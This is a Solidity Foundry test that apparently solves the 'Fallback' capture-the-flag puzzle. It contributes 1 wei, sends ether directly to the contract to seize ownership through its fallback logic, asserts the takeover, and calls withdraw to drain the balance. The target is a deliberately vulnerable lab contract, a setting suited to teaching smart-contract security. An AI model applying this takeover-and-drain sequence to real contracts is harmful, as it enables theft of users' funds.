// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "ds-test/test.sol";
import "../src/Fallback.sol";
import {Vm} from "forge-std/Vm.sol";

contract FallbackTest is DSTest {
    Fallback public fallbackInstance;
    Vm private constant vm = Vm(HEVM_ADDRESS);
    address eoaAddress = address(69);

    function setUp() public {
        // Initializing Fallback contract.
        fallbackInstance = new Fallback();
        vm.label(0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84, "Fallback Owner");
        vm.deal(eoaAddress, 1 ether);
    }

    function testIsFallbackCleared() public {
        vm.startPrank(address(69));
        fallbackInstance.contribute{value: 1 wei}();
        assertEq(fallbackInstance.contributions(eoaAddress), 1 wei);
        (bool success, ) = payable(fallbackInstance).call{value: 1 wei}("");
        assertTrue(success);
        assertEq(fallbackInstance.owner(), eoaAddress);

        fallbackInstance.withdraw();

        vm.stopPrank();
    }
}
